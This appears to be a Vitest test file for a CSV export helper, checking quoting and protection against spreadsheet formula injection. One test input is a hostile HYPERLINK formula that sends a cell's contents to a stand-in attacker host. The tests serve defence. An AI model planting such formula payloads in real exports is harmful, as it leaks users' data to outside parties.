import { describe, expect, it } from "vitest";
import { toCsv } from "@/lib/csv";

describe("toCsv", () => {
  it("quotes fields containing commas, quotes, or newlines", () => {
    const csv = toCsv(["Name"], [['Say "hi", bye']]);
    expect(csv).toContain('"Say ""hi"", bye"');
  });

  it("neutralizes a leading formula character to prevent CSV injection", () => {
    const csv = toCsv(
      ["Customer"],
      [['=HYPERLINK("http://evil.example/?leak="&A1,"Click me")']]
    );
    const dataLine = csv.split("\r\n")[1]!;
    expect(dataLine.startsWith("=")).toBe(false);
    expect(dataLine).toContain("'=HYPERLINK");
  });

  it("neutralizes +, -, @, and tab-prefixed fields too", () => {
    for (const malicious of ["+1+1", "-2+3", "@SUM(1,2)", "\tcmd"]) {
      const csv = toCsv(["Field"], [[malicious]]);
      // Strip an outer CSV quote (added when the value also contains a
      // comma, e.g. "@SUM(1,2)") before checking for the neutralizing "'".
      const dataLine = csv.split("\r\n")[1]!.replace(/^"/, "");
      expect(dataLine.startsWith("'")).toBe(true);
    }
  });

  it("leaves ordinary text untouched", () => {
    const csv = toCsv(["Name"], [["Rosa Martinez"]]);
    expect(csv).toContain("Rosa Martinez");
    expect(csv).not.toContain("'Rosa");
  });
});
